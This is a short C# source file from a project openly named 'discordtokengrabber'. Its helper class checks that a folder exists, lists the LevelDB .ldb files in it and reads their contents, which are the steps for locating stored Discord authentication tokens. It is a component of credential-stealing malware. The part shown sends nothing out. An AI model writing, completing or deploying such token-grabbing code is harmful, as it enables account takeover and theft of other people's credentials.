using System;
using System.IO;
using System.Text;

namespace discordtokengrabber
{
    public class miscellaneous
    {
        public bool validate_path(string target_path)
        {
            return Directory.Exists(target_path);
        }

        public string[] get_ldb_files(string target_path)
        {
            return Directory.GetFiles(target_path, "*.ldb", SearchOption.TopDirectoryOnly);
        }

        public string read_file(string target_file)
        {
            return File.ReadAllText(target_file);
        }
    }
}
